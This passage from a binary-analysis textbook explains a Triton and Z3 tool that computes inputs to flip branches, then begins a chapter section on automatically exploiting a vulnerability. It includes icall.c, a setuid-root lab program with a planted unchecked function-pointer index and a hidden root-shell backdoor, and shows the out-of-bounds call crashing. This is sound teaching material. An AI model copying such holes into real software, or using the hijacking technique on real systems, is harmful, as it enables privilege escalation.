<pre>   #include "../inc/loader.h"<br/>   #include "triton_util.h"<br/>   #include "disasm_util.h"<br/><br/>   #include &lt;triton/api.hpp&gt;<br/>   #include &lt;triton/x86Specifications.hpp&gt;<br/><br/>   int<br/>   main(int argc, char *argv[])<br/>   {<br/>     Binary bin;<br/>     triton::API api;<br/>     triton::arch::registers_e ip;<br/>     std::map&lt;triton::arch::registers_e, uint64_t&gt; regs;<br/>     std::map&lt;uint64_t, uint8_t&gt; mem;<br/>     std::vector&lt;triton::arch::registers_e&gt; symregs;<br/>     std::vector&lt;uint64_t&gt; symmem;<br/><br/>     if(argc &lt; 5) {<br/>       printf("Usage: %s &lt;binary&gt; &lt;sym-config&gt; &lt;entry&gt; &lt;branch-addr&gt;\n", argv[0]);<br/>       return 1;<br/>   }<br/><br/>   std::string fname(argv[1]);<br/>   if(load_binary(fname, &amp;bin, Binary::BIN_TYPE_AUTO) &lt; 0) return 1;<br/><br/>   if(set_triton_arch(bin, api, ip) &lt; 0) return 1;<br/>   api.enableMode(triton::modes::ALIGNED_MEMORY, true);<br/><br/><span class="ent">➊</span>  if(parse_sym_config(argv[2], &amp;regs, &amp;mem, &amp;symregs, &amp;symmem) &lt; 0) return 1;<br/>    for(auto &amp;kv: regs) {<br/>      triton::arch::Register r = api.getRegister(kv.first);<br/>      api.setConcreteRegisterValue(r, kv.second);<br/>   }<br/><span epub:type="pagebreak" id="page_347"/><span class="ent">➋</span>  for(auto regid: symregs) {<br/>     triton::arch::Register r = api.getRegister(regid);<br/>     api.convertRegisterToSymbolicVariable(r)-&gt;setComment(r.getName());<br/>   }<br/>   for(auto &amp;kv: mem) {<br/>     api.setConcreteMemoryValue(kv.first, kv.second);<br/>   }<br/><span class="ent">➌</span>  for(auto memaddr: symmem) {<br/>     api.convertMemoryToSymbolicVariable(<br/>         triton::arch::MemoryAccess(memaddr, 1))-&gt;setComment(std::to_string(memaddr));<br/>   }<br/><br/>    uint64_t pc          = strtoul(argv[3], NULL, 0);<br/>    uint64_t branch_addr = strtoul(argv[4], NULL, 0);<br/>    Section *sec = bin.get_text_section();<br/><br/><span class="ent">➍</span>  while(sec-&gt;contains(pc)) {<br/>      char mnemonic[32], operands[200];<br/>      int len = disasm_one(sec, pc, mnemonic, operands);<br/>      if(len &lt;= 0) return 1;<br/><br/>      triton::arch::Instruction insn;<br/>      insn.setOpcode(sec-&gt;bytes+(pc-sec-&gt;vma), len);<br/>      insn.setAddress(pc);<br/><br/>      api.processing(insn);<br/><br/><span class="ent">➎</span>    if(pc == branch_addr) {<br/>        find_new_input(api, sec, branch_addr);<br/>        break;<br/>      }<br/><br/>      pc = (uint64_t)api.getConcreteRegisterValue(api.getRegister(ip));<br/>    }<br/><br/>    unload_binary(&amp;bin);<br/><br/>    return 0;<br/>  }</pre>&#13;
<p class="indent">To use the <code>code_coverage</code> tool, you supply command line arguments specifying the binary to analyze, a symbolic configuration file, the entry point address for the analysis, and the address of a direct branch instruction. The tool assumes that your symbolic configuration file contains concrete inputs that cause the branch to take one of the two possible paths (it doesn’t matter <span epub:type="pagebreak" id="page_348"/>which path). It then uses the constraint solver to compute a model containing a new set of concrete inputs that will cause the branch to go the other way. For the solver to succeed, you must take care to symbolize all the registers and memory locations that the branch you want to flip depends on.</p>&#13;
<p class="indent">As you can see in the listing, <code>code_coverage</code> includes the same utility and Triton header files as the previous example. Moreover, the <code>main</code> function of <code>code_coverage</code> is almost identical to the <code>main</code> function of <code>backward_slicing</code>. As in that example, it starts by loading the binary and configuring the Triton architecture and then enables the <code>ALIGNED_MEMORY</code> optimization.</p>&#13;
<h4 class="h4" id="ch13_4_1"><em>13.4.1 Creating Symbolic Variables</em></h4>&#13;
<p class="noindent">A difference between this and the previous example is that the code that parses the symbolic configuration file passes two optional arguments (<code>symregs</code> and <code>symmem</code>) <span class="ent">➊</span> to <code>parse_sym_config</code>. These are output arguments where <code>parse _sym_config</code> writes the lists of registers and memory locations to symbolize according to the configuration file. In the configuration file, you’ll want to symbolize all registers and memory locations that contain user inputs so that the model the constraint solver returns will give you a concrete value for each of those user inputs.</p>&#13;
<p class="indent">After assigning the concrete values from the configuration file, <code>main</code> loops over the list of registers to symbolize and symbolizes them using Triton’s <code>api.convertRegisterToSymbolicVariable</code> function <span class="ent">➋</span>. The same line of code that symbolizes the register immediately sets a comment on the just-created symbolic variable, specifying the register’s human-readable name. That way, when you later get a model from the constraint solver, you’ll know how to map the symbolic variable assignments in the model back onto the real registers and memory.</p>&#13;
<p class="indent">The loop that symbolizes memory locations is similar. For each memory location to symbolize, it builds a <code>triton::arch::MemoryAccess</code> object, which specifies the address and size (in bytes) of the memory location. In this case, I’ve hardcoded the size to 1 byte because the configuration file format allows you to reference memory locations only at byte granularity. To symbolize the address specified in a <code>MemoryAccess</code> object, you use the Triton function <code>api.convertMemoryToSymbolicVariable</code> <span class="ent">➌</span>. After that, the loop sets a comment mapping the new symbolic variable to a human-readable string containing the memory address.</p>&#13;
<h4 class="h4" id="ch13_4_2"><em>13.4.2 Finding a Model for a New Path</em></h4>&#13;
<p class="noindent">The emulation loop <span class="ent">➍</span> is the same as in <code>backward_slicing</code>, except that this time it emulates until <code>pc</code> is equal to the address of the branch for which you want to find a new set of inputs <span class="ent">➎</span>. To find these new inputs, <code>code_coverage</code> calls a separate function named <code>find_new_input</code>, which is shown in <a href="ch13.xhtml#ch13list7">Listing 13-7</a>.</p>&#13;
<p class="listing1" id="ch13list7"><span epub:type="pagebreak" id="page_349"/><em>Listing 13-7:</em> code_coverage.cc <em>(continued)</em></p>&#13;
<pre>   static void<br/>   find_new_input(triton::API &amp;api, Section *sec, uint64_t branch_addr)<br/>   {<br/><span class="ent">➊</span>   triton::ast::AstContext &amp;ast = api.getAstContext();<br/><span class="ent">➋</span>   triton::ast::AbstractNode *constraint_list = ast.equal(ast.bvtrue(), ast.bvtrue());<br/>   <br/>     printf("evaluating branch 0x%jx:\n", branch_addr);<br/><br/><span class="ent">➌</span>   const std::vector&lt;triton::engines::symbolic::PathConstraint&gt; &amp;path_constraints<br/>         = api.getPathConstraints();<br/><span class="ent">➍</span>   for(auto &amp;pc: path_constraints) {<br/><span class="ent">➎</span>     if(!pc.isMultipleBranches()) continue;<br/><span class="ent">➏</span>     for(auto &amp;branch_constraint: pc.getBranchConstraints()) {<br/>        bool flag         = std::get&lt;0&gt;(branch_constraint);<br/>        uint64_t src_addr = std::get&lt;1&gt;(branch_constraint);<br/>        uint64_t dst_addr = std::get&lt;2&gt;(branch_constraint);<br/>        triton::ast::AbstractNode *constraint = std::get&lt;3&gt;(branch_constraint);<br/><br/><span class="ent">➐</span>      if(src_addr != branch_addr) {<br/>          /* this is not our target branch, so keep the existing "true" constraint */<br/><span class="ent">➑</span>        if(flag) {<br/>            constraint_list = ast.land(constraint_list, constraint);<br/>         }<br/><span class="ent">➒</span>     } else {<br/>        /* this is our target branch, compute new input */<br/>        printf("    0x%jx -&gt; 0x%jx (%staken)\n",<br/>               src_addr, dst_addr, flag ? "" : "not ");<br/><br/><span class="ent">➓</span>      if(!flag) {<br/>          printf("    computing new input for 0x%jx -&gt; 0x%jx\n",<br/>                src_addr, dst_addr);<br/>          constraint_list = ast.land(constraint_list, constraint);<br/>          for(auto &amp;kv: api.getModel(constraint_list)) {<br/>            printf("      SymVar %u (%s) = 0x%jx\n",<br/>                  kv.first,<br/>                  api.getSymbolicVariableFromId(kv.first)-&gt;getComment().c_str(),<br/>                  (uint64_t)kv.second.getValue());<br/>          }<br/>        }<br/>      }<br/>    }<br/>  }<br/>}</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_350"/>To find inputs that reach the previously unexplored branch direction, <code>find_new_input</code> feeds the solver the list of constraints that must be satisfied to reach the desired branch and then asks it for a model that satisfies those constraints. Recall that Triton represents constraints as abstract syntax trees, so to encode branch constraints, you need to build a corresponding AST. That’s why <code>find_new_input</code> starts by calling <code>api.getAstContext</code> to get a reference (called <code>ast</code>) to an <code>AstContext</code> <span class="ent">➊</span>, which is Triton’s builder class for AST formulas.</p>&#13;
<p class="indent">To store the list of constraints that will model the path leading to the unexplored branch direction, <code>find_new_input</code> uses a <code>triton::ast::AbstractNode</code> object, reachable through a pointer called <code>constraint_list</code> <span class="ent">➋</span>. <code>AbstractNode</code> is Triton’s class for representing AST nodes. To initialize <code>constraint_list</code>, you set it to the formula <code>ast.equal(ast.bvtrue(), ast.bvtrue())</code>, meaning the logical tautology <code>true == true</code>, where each <code>true</code> is a bitvector. This is just a way of initializing the constraint list to a syntactically valid formula that doesn’t impose any constraints and to which you can easily concatenate additional constraints.</p>&#13;
<h5 class="h5">Copying and Flipping Branch Constraints</h5>&#13;
<p class="noindent">Next, <code>find_new_input</code> calls <code>api.getPathConstraints</code> to get the list of path constraints that Triton has accumulated while emulating the code <span class="ent">➌</span>. The list takes the form of a <code>std::vector</code> of <code>triton::engines::symbolic::PathConstraint</code> objects, where each <code>PathConstraint</code> is associated with one branch instruction. This list contains all the constraints that must be satisfied to take the just-emulated path. To turn this into a list of constraints for a new path, you copy all the constraints except the one for the branch you want to change, which you flip to the other branch direction.</p>&#13;
<p class="indent">To implement this, <code>find_new_input</code> loops over the list of path constraints <span class="ent">➍</span> and copies or flips each one. Inside each <code>PathConstraint</code>, Triton stores one or more <em>branch constraints</em>, one for each possible branch direction. In the context of code coverage, you’re interested only in multiway branches such as conditional jumps because single-way branches like direct calls or unconditional jumps don’t have any new direction to explore. To determine whether a <code>PathConstraint</code> called <code>pc</code> represents a multiway branch, you call <code>pc.isMultipleBranches</code> <span class="ent">➎</span>, which returns <code>true</code> if the branch is multiway.</p>&#13;
<p class="indent">For <code>PathConstraint</code> objects that contain multiple branch constraints, <code>find _new_input</code> gets all the branch constraints by calling <code>pc.getBranchConstraints</code> and then loops over each constraint in the list <span class="ent">➏</span>. Each constraint is a tuple of a Boolean flag, a source and destination address (both <code>triton::uint64</code>), and an AST encoding the branch constraint. The flag denotes whether the branch direction represented by the branch constraint was taken during the emulation. For example, consider the following conditional branch:</p>&#13;
<pre>4055dc:       3c 25                    cmp     al,0x25<br/> 4055de:       0f 8d f4 00 00 00        jge     4056d8</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_351"/>When emulating the <code>jge</code>, Triton creates a <code>PathConstraint</code> object with two branch constraints. Let’s assume that the first branch constraint represents the <em>taken</em> direction of the <code>jge</code> (that is, the direction that’s taken if the condition holds) and that this is the direction taken during the emulation. That means the first branch constraint stored in the <code>PathConstraint</code> has a <code>true</code> flag (because it was taken during the emulation), and the source and destination addresses will be <code>0x4055de</code> (the address of the <code>jge</code>) and <code>0x4056d8</code> (the target of the <code>jge</code>), respectively. The AST for this branch condition will encode the condition <code>al</code> ≥ <code>0x25</code>. The second branch constraint has a <code>false</code> flag, representing the branch direction that wasn’t taken during emulation. The source and destination addresses are <code>0x4055de</code> and <code>0x4055e4</code> (the fallthrough address of the <code>jge</code>), and the AST encodes the condition <code>al</code> &lt; <code>0x25</code> (or more precisely, <code>not(al</code> ≥ <code>0x25)</code>).</p>&#13;
<p class="indent">Now, for each <code>PathConstraint</code>, <code>find_new_input</code> copies the branch constraint whose flag is <code>true</code>, except for the <code>PathConstraint</code> associated with the branch instruction you want to flip, for which it instead copies the <code>false</code> branch constraint, thereby inverting that branch decision. To recognize the branch to flip, <code>find_new_input</code> uses the branch source address. For constraints with a source address unequal to the address of the branch to invert <span class="ent">➐</span>, it copies the branch constraint with the <code>true</code> flag <span class="ent">➑</span> and appends it to the <code>constraint_list</code> using a logical AND, implemented with <code>ast.land</code>.</p>&#13;
<h5 class="h5">Getting a Model from the Constraint Solver</h5>&#13;
<p class="noindent">Finally, <code>find_new_input</code> will encounter the <code>PathConstraint</code> associated with the branch you want to flip. It contains multiple branch constraints whose source address is equal to the address of the branch to flip <span class="ent">➒</span>. To clearly show all possible branch directions in <code>code_coverage</code>’s output, <code>find_new_input</code> prints each branch condition with a matching source address, regardless of its flag.</p>&#13;
<p class="indent">If the flag is <code>true</code>, then <code>find_new_input</code> <em>doesn’t</em> append the branch constraint to the <code>constraint_list</code> because it corresponds to the branch direction you’ve already explored. However, if the flag is <code>false</code> <span class="ent">➓</span>, it represents the unexplored branch direction, so <code>find_new_input</code> appends this branch constraint to the constraint list and passes the list to the constraint solver by calling <code>api.getModel</code>.</p>&#13;
<p class="indent">The <code>getModel</code> function invokes the constraint solver Z3 and asks it for a model that satisfies the list of constraints. If a model is found, <code>getModel</code> returns it as a <code>std::map</code> that maps Triton symbolic variable identifiers to <code>triton::engines::solver::SolverModel</code> objects. The model represents a new set of concrete inputs to the analyzed program that will cause the program to take the previously unexplored branch direction. If no model is found, the returned map is empty.</p>&#13;
<p class="indent">Each <code>SolverModel</code> object contains the concrete value that the constraint solver assigned to the corresponding symbolic variable in the model. The <code>code_coverage</code> tool reports the model to the user by looping over the map and printing each symbolic variable’s ID and comment, which contains the human-readable name of the corresponding register or memory <span epub:type="pagebreak" id="page_352"/>location, as well as the concrete value assigned in the model (as returned by <code>SolverModel::getValue</code>).</p>&#13;
<p class="indent">To see how to use the output of <code>code_coverage</code> in practice, let’s now try it on a test program to find and use new inputs to cover a branch of your choice.</p>&#13;
<h4 class="h4" id="ch13_4_3"><em>13.4.3 Testing the Code Coverage Tool</em></h4>&#13;
<p class="noindent"><a href="ch13.xhtml#ch13list8">Listing 13-8</a> shows a simple test program that you can use to try the ability of <code>code_coverage</code> to generate inputs that explore a new branch direction.</p>&#13;
<p class="listing1" id="ch13list8"><em>Listing 13-8:</em> branch.c</p>&#13;
<pre>   #include &lt;stdio.h&gt;<br/>   #include &lt;stdlib.h&gt;<br/><br/>   void<br/>   branch(int x, int y)<br/>   {<br/><span class="ent">➊</span>   if(x &lt; 5) {<br/><span class="ent">➋</span>     if(y == 10) printf("x &lt; 5 &amp;&amp; y == 10\n");<br/>       else        printf("x &lt; 5 &amp;&amp; y != 10\n");<br/>     } else {<br/>       printf("x &gt;= 5\n");<br/>     }<br/>   }<br/><br/>   int<br/>   main(int argc, char *argv[])<br/>   {<br/>     if(argc &lt; 3) {<br/>       printf("Usage: %s &lt;x&gt; &lt;y&gt;\n", argv[0]);<br/>       return 1;<br/>     }<br/><br/><span class="ent">➌</span>   branch(strtol(argv[1], NULL, 0), strtol(argv[2], NULL, 0));<br/><br/>     return 0;<br/>   }</pre>&#13;
<p class="indent">As you can see, the <code>branch</code> program contains a function called <code>branch</code>, which takes two integers called <code>x</code> and <code>y</code> as input. The <code>branch</code> function contains an outer <code>if</code>/<code>else</code> branch based on the value of <code>x</code> <span class="ent">➊</span> and a nested <code>if</code>/<code>else</code> branch based on <code>y</code> <span class="ent">➋</span>. The function is called by <code>main</code> with the <code>x</code> and <code>y</code> arguments being supplied from user input <span class="ent">➌</span>.</p>&#13;
<p class="indent">Let’s first run <code>branch</code> with <code>x = 0</code> and <code>y = 0</code> so that the outer branch takes the <code>if</code> direction and the nested branch takes the <code>else</code> direction. Then you can use <code>code_coverage</code> to find inputs to flip the nested branch so it takes the <span epub:type="pagebreak" id="page_353"/><code>if</code> direction. But first, let’s build the symbolic configuration file needed to run <code>code_coverage</code>.</p>&#13;
<h5 class="h5">Building a Symbolic Configuration File</h5>&#13;
<p class="noindent">To use <code>code_coverage</code>, you need a symbolic configuration file, and to make that, you need to know which registers and memory locations the compiled version of <code>branch</code> uses. <a href="ch13.xhtml#ch13list9">Listing 13-9</a> shows the disassembly of the <code>branch</code> function. Let’s analyze it to find out which registers and memory locations <code>branch</code> uses.</p>&#13;
<p class="listing1" id="ch13list9"><em>Listing 13-9: Disassembly excerpt from</em> ~/code/chapter13/branch</p>&#13;
<pre>   <span class="codestrong1">$ objdump -M intel -d ./branch</span><br/>   ...<br/>   00000000004005b6 &lt;branch&gt;:<br/>     4005b6:  55               push   rbp<br/>     4005b7:  48 89 e5         mov    rbp,rsp<br/>     4005ba:  48 83 ec 10      sub    rsp,0x10<br/><span class="ent">➊</span>   4005be:  89 7d fc         mov    DWORD PTR [rbp-0x4],edi<br/><span class="ent">➋</span>   4005c1:  89 75 f8         mov    DWORD PTR [rbp-0x8],esi<br/><span class="ent">➌</span>   4005c4:  83 7d fc 04      cmp    DWORD PTR [rbp-0x4],0x4<br/><span class="ent">➍</span>   4005c8:  7f 1e            jg     4005e8 &lt;branch+0x32&gt;<br/><span class="ent">➎</span>   4005ca:  83 7d f8 0a      cmp    DWORD PTR [rbp-0x8],0xa<br/><span class="ent">➏</span>   4005ce:  75 0c            jne    4005dc &lt;branch+0x26&gt;<br/>     4005d0:  bf 04 07 40 00   mov    edi,0x400704<br/>     4005d5:  e8 96 fe ff ff   call   400470 &lt;puts@plt&gt;<br/>     4005da:  eb 16            jmp    4005f2 &lt;branch+0x3c&gt;<br/>     4005dc:  bf 15 07 40 00   mov    edi,0x400715<br/>     4005e1:  e8 8a fe ff ff   call   400470 &lt;puts@plt&gt;<br/>     4005e6:  eb 0a            jmp    4005f2 &lt;branch+0x3c&gt;<br/>     4005e8:  bf 26 07 40 00   mov    edi,0x400726<br/>     4005ed:  e8 7e fe ff ff   call   400470 &lt;puts@plt&gt;<br/>     4005f2:  c9               leave<br/>     4005f3:  c3               ret<br/>   ...</pre>&#13;
<p class="indent">The Ubuntu installation on the VM uses the x64 version of the System V <em>application binary interface (ABI)</em>, which dictates the <em>calling convention</em> used on the system. In the System V calling convention for x64 systems, the first and second arguments to a function call are stored in the <code>rdi</code> and <code>rsi</code> registers, respectively.<sup><a id="ch13fn_6a" href="footnote.xhtml#ch13fn_6">6</a></sup> In this case, this means you’ll find the <code>x</code> parameter of the <code>branch</code> function in <code>rdi</code> and the <code>y</code> parameter in <code>rsi</code>. Internally, the <code>branch</code> function immediately moves <code>x</code> to the memory location <code>rbp-0x4</code> <span class="ent">➊</span> and <code>y</code> to <code>rbp-0x8</code> <span class="ent">➋</span>. Then <code>branch</code> compares the first memory location containing <code>x</code> <span epub:type="pagebreak" id="page_354"/>against the value 4 <span class="ent">➌</span>, followed by a <code>jg</code> at address <code>0x4005c8</code>, which implements the outer <code>if</code>/<code>else</code> branch <span class="ent">➍</span>.</p>&#13;
<p class="indent">The <code>jg</code>’s target address <code>0x4005e8</code> contains the <code>else</code> case (<code>x</code> ≥ <code>5</code>), while the fallthrough address <code>0x4005ca</code> contains the <code>if</code> case. Inside the <code>if</code> case is the nested <code>if</code>/<code>else</code> branch, which is implemented as a <code>cmp</code> that compares <code>y</code>’s value to 10 (<code>0xa</code>) <span class="ent">➎</span>, followed by a <code>jne</code> that jumps to <code>0x4005dc</code> if <code>y</code> ≠ 10 <span class="ent">➏</span> (the nested <code>else</code>) or falls through to <code>0x4005d0</code> otherwise (the nested <code>if</code> case).</p>&#13;
<p class="indent">Now that you know which registers contain the <code>x</code> and <code>y</code> inputs and the address <code>0x4005ce</code> of the nested branch you want to flip, let’s make the symbolic configuration file. <a href="ch13.xhtml#ch13list10">Listing 13-10</a> shows the configuration file to use for the test.</p>&#13;
<p class="listing1" id="ch13list10"><em>Listing 13-10:</em> branch.map</p>&#13;
<pre><span class="ent">➊</span> %rdi=$<br/>  %rdi=0<br/><span class="ent">➋</span> %rsi=$<br/>  %rsi=0</pre>&#13;
<p class="indent">The configuration file makes <code>rdi</code> (representing <code>x</code>) symbolic and assigns it the concrete value 0 <span class="ent">➊</span>. It does the same for <code>rsi</code>, which contains <code>y</code> <span class="ent">➋</span>. Because <code>x</code> and <code>y</code> are both symbolic, when you generate a model for the new inputs, the constraint solver will give you concrete values for both <code>x</code> and <code>y</code>.</p>&#13;
<h5 class="h5">Generating a New Input</h5>&#13;
<p class="noindent">Recall that the symbolic configuration file assigns the value 0 to both <code>x</code> and <code>y</code>, creating a baseline from which <code>code_coverage</code> can generate a new input that covers a different path. When you run the <code>branch</code> program with these baseline inputs, it prints the message <code>x &lt; 5 &amp;&amp; y != 10</code>, as shown in the following listing:</p>&#13;
<pre><span class="codestrong1">$ ./branch 0 0</span><br/>x &lt; 5 &amp;&amp; y != 10</pre>&#13;
<p class="indent">Let’s now use <code>code_coverage</code> to generate new inputs that flip the nested <code>branch</code> that checks y’s value so that you can use these new inputs to run branch again and get the output x &lt; 5 &amp;&amp; y == 10 instead. <a href="ch13.xhtml#ch13list11">Listing 13-11</a> shows how to do that.</p>&#13;
<p class="listing1" id="ch13list11"><em>Listing 13-11: Finding inputs to take the alternative branch at</em> <span class="codeitalic">0x4005ce</span></p>&#13;
<pre><span class="ent">➊</span> <span class="codestrong1">$ ./code_coverage branch branch.map 0x4005b6 0x4005ce</span><br/>   evaluating branch 0x4005ce:<br/><span class="ent">➋</span>      0x4005ce -&gt; 0x4005dc (taken)<br/><span class="ent">➌</span>      0x4005ce -&gt; 0x4005d0 (not taken)<br/><span class="ent">➍</span>      computing new input for 0x4005ce -&gt; 0x4005d0<br/><span class="ent">➎</span>        SymVar 0 (rdi) = 0x0<br/>          SymVar 1 (rsi) = 0xa</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_355"/>You call <code>code_coverage</code> giving the <code>branch</code> program as input, as well as the symbolic configuration file you made (<code>branch.map</code>), the start address <code>0x4005b6</code> of the <code>branch</code> function (the entry point for the analysis), and the address <code>0x4005ce</code> of the nested branch to flip <span class="ent">➊</span>.</p>&#13;
<p class="indent">When the emulation hits that branch address, <code>code_coverage</code> evaluates and prints each of the branch constraints that Triton generated as part of the <code>PathConstraint</code> associated with the branch. The first constraint is for the branch direction with target address <code>0x4005dc</code> (the nested <code>else</code>), and this direction is taken during the emulation because of the concrete input values you specified in the configuration file <span class="ent">➋</span>. As <code>code_coverage</code> reports, the fallthrough branch direction with destination address <code>0x4005d0</code> (the nested <code>if</code> case) is not taken <span class="ent">➌</span>, so <code>code_coverage</code> tries to compute new input values that lead to that branch direction <span class="ent">➍</span>.</p>&#13;
<p class="indent">Although in general the constraint solving required to find the new input values can take a while, it should complete in only a few seconds for constraints as simple as this case. Once the solver finds a model, <code>code_coverage</code> prints it to screen <span class="ent">➎</span>. As you can see, the model assigns the concrete value 0 to <code>rdi</code> (<code>x</code>) and the value <code>0xa</code> to <code>rsi</code> (<code>y</code>).</p>&#13;
<p class="indent">Let’s run the <code>branch</code> program with these new inputs to see whether they cause the nested branch to flip.</p>&#13;
<pre>$<span class="codestrong1"> ./branch 0 0xa</span><br/>x &lt; 5 &amp;&amp; y == 10</pre>&#13;
<p class="indent">With these new inputs, <code>branch</code> prints the output <code>x &lt; 5 &amp;&amp; y == 10</code>, not the message <code>x &lt; 5 &amp;&amp; y != 10</code> that you got in the previous run of the <code>branch</code> program. The inputs generated by <code>code_coverage</code> successfully flipped the direction of the nested branch!</p>&#13;
<h3 class="h3" id="ch13_5">13.5 Automatically Exploiting a Vulnerability</h3>&#13;
<p class="noindent">Now let’s look at an example that requires more complex constraint solving than the previous example. In this section, you’ll learn to use Triton to automatically generate inputs that exploit a vulnerability in a program by hijacking an indirect call site and redirecting it to an address of your choice.</p>&#13;
<p class="indent">Let’s assume that you already know there’s a vulnerability that allows you to control the call site’s target, but you don’t yet know how to exploit it to reach the address you want because the target address is computed from the user inputs in a nontrivial way. This is a situation you may encounter in real life during fuzzing, for example.</p>&#13;
<p class="indent">As you learned in <a href="ch12.xhtml#ch12">Chapter 12</a>, symbolic execution is too computationally expensive for a brute-force fuzzing approach that tries to find an exploit for every indirect call site in a program. Instead, you can optimize by first fuzzing the program in a more traditional way, supplying it with many pseudorandomly generated inputs and using taint analysis to determine whether these inputs affect dangerous program state, such as indirect call sites. Then, you can use symbolic execution to generate exploits only for <span epub:type="pagebreak" id="page_356"/>those call sites that the taint analysis has revealed to be potentially controllable. This is the use case I assume in the following example.</p>&#13;
<h4 class="h4" id="ch13_5_1"><em>13.5.1 The Vulnerable Program</em></h4>&#13;
<p class="noindent">First, let’s take a look at the program to exploit and the vulnerable call site it contains. <a href="ch13.xhtml#ch13list12">Listing 13-12</a> shows the vulnerable program’s source file <em>icall.c</em>. The <em>Makefile</em> compiles the program into a <code>setuid root</code> binary<sup><a id="ch13fn_7a" href="footnote.xhtml#ch13fn_7">7</a></sup> called <code>icall</code> that contains an indirect call site that calls one of several handler functions. This is similar to how web servers like <code>nginx</code> use function pointers to choose an appropriate handler for the data they receive.</p>&#13;
<p class="listing1" id="ch13list12"><em>Listing 13-12:</em> icall.c</p>&#13;
<pre>   #include &lt;stdio.h&gt;<br/>   #include &lt;stdlib.h&gt;<br/>   #include &lt;string.h&gt;<br/>   #include &lt;unistd.h&gt;<br/>   #include &lt;crypt.h&gt;<br/><br/>   void forward (char *hash);<br/>   void reverse (char *hash);<br/>   void hash    (char *src, char *dst);<br/><br/><span class="ent">➊</span> static struct {<br/>     void (*functions[2])(char *);<br/>     char hash[5];<br/>   } icall;<br/><br/>   int<br/>   main(int argc, char *argv[])<br/>   {<br/>     unsigned i;<br/><br/><span class="ent">➋</span>   icall.functions[0] = forward;<br/>     icall.functions[1] = reverse;<br/><br/>     if(argc &lt; 3) {<br/>       printf("Usage: %s &lt;index&gt; &lt;string&gt;\n", argv[0]);<br/>       return 1;<br/>     }<br/><br/><span class="ent">➌</span>    if(argc &gt; 3 &amp;&amp; !strcmp(crypt(argv[3], "$1$foobar"), "$1$foobar$Zd2XnPvN/dJVOseI5/5Cy1")) {<br/>        /* secret admin area */<br/><span epub:type="pagebreak" id="page_357"/>        if(setgid(getegid())) perror("setgid");<br/>        if(setuid(geteuid())) perror("setuid");<br/>        execl("/bin/sh", "/bin/sh", (char*)NULL);<br/><span class="ent">➍</span>    } else {<br/><span class="ent">➎</span>      hash(argv[2], icall.hash);<br/><span class="ent">➏</span>      i = strtoul(argv[1], NULL, 0);<br/><br/>        printf("Calling %p\n", (void*)icall.functions[i]);<br/><span class="ent">➐</span>      icall.functions[i](icall.hash);<br/>     }<br/><br/>     return 0;<br/>   }<br/><br/>   void<br/>   forward(char *hash)<br/>   {<br/>     int i;<br/><br/>     printf("forward: ");<br/>     for(i = 0; i &lt; 4; i++) {<br/>       printf("%02x", hash[i]);<br/>    }<br/>    printf("\n");<br/>   }<br/><br/>   void<br/>   reverse(char *hash)<br/>   {<br/>     int i;<br/><br/>     printf("reverse: ");<br/>     for(i = 3; i &gt;= 0; i--) {<br/>       printf("%02x", hash[i]);<br/>     }<br/>     printf("\n");<br/>   }<br/><br/>   void<br/>   hash(char *src, char *dst)<br/>   {<br/>     int i, j;<br/><br/>     for(i = 0; i &lt; 4; i++) {<br/>       dst[i] = 31 + (char)i;<br/>       for(j = i; j &lt; strlen(src); j += 4) {<br/>         dst[i] ˆ= src[j] + (char)j;<br/><span epub:type="pagebreak" id="page_358"/>         if(i &gt; 1) dst[i] ˆ= dst[i-2];<br/>       }<br/>     }<br/>     dst[4] = '\0';<br/>   }</pre>&#13;
<p class="indent">The <code>icall</code> program revolves around a global <code>struct</code>, which is also called <code>icall</code> <span class="ent">➊</span>. This <code>struct</code> contains an array called <code>icall.functions</code> that has room for two function pointers and a <code>char</code> array called <code>icall.hash</code> that stores a 4-byte hash with a terminating <code>NULL</code> character. The <code>main</code> function initializes the first entry in <code>icall.functions</code> so that it points to a function called <code>forward</code>, and initializes the second entry so that it points to <code>reverse</code> <span class="ent">➋</span>. Both these functions take a hash parameter in the form of a <code>char*</code> and print the hash’s bytes in forward or reverse order, respectively.</p>&#13;
<p class="indent">The <code>icall</code> program takes two command line arguments: an integer index and a string. The index decides which entry from <code>icall.functions</code> will be called, while the string serves as input to generate the hash, as you’ll see in a moment.</p>&#13;
<p class="indent">There’s also a secret third command line argument not advertised in the usage string. This argument is a password for an admin area that provides a root shell. To check the password, <code>icall</code> hashes it with the GNU <code>crypt</code> function (from <em>crypt.h</em>), and if the hash is correct, the user is granted access to the root shell <span class="ent">➌</span>. Our goal for the exploit is to hijack an indirect call site and redirect it to this secret admin area without knowing the password.</p>&#13;
<p class="indent">If no secret password is supplied <span class="ent">➍</span>, <code>icall</code> calls a function named <code>hash</code> that computes a 4-byte hash over the string supplied by the user and places that hash in <code>icall.hash</code> <span class="ent">➎</span>. After computing the hash, <code>icall</code> parses the index from the command line <span class="ent">➏</span> and uses it to index the <code>icall.functions</code> array, indirectly calling the handler at that index and passing the just-computed hash as the argument <span class="ent">➐</span>. This indirect call is the one I’ll use in the exploit. For diagnostics, <code>icall</code> prints the address of the function it’s about to invoke, which will be handy later when crafting the exploit.</p>&#13;
<p class="indent">Normally, the indirect call invokes <code>forward</code> or <code>reverse</code>, which then prints the hash to screen as follows:</p>&#13;
<pre><span class="ent">➊</span> <span class="codestrong1">$ ./icall 1 foo</span><br/><span class="ent">➋</span> Calling 0x400974<br/><span class="ent">➌</span> reverse: 22295079</pre>&#13;
<p class="indent">Here, I’ve used <code>1</code> as the function index, resulting in a call to the <code>reverse</code> function, and <code>foo</code> as the input string <span class="ent">➊</span>. You can see that the indirect call targets address <code>0x400974</code> (the start of <code>reverse</code>) <span class="ent">➋</span>, and the hash of <code>foo</code>, printed in reverse, is <code>0x22295079</code> <span class="ent">➌</span>.</p>&#13;
<p class="indent">You may have noticed that the indirect call is vulnerable: there’s no verification that the user-supplied index stays within the bounds of <code>icall.functions</code>, so by supplying an out-of-bounds index, the user can coax the <code>icall</code> program into using data <em>outside</em> the <code>icall.functions</code> array as <span epub:type="pagebreak" id="page_359"/>the indirect call target! As it happens, the <code>icall.hash</code> field is adjacent to <code>icall.functions</code> in memory, so by supplying the out-of-bounds index 2, the user can trick the <code>icall</code> program into using <code>icall.hash</code> as the indirect call target, as you can see in the following listing:</p>&#13;
<pre><span class="codestrong1">   $ ./icall 2 foo</span><br/><span class="ent">➊</span> Calling 0x22295079<br/><span class="ent">➋</span> Segmentation fault (core dumped)</pre>&#13;
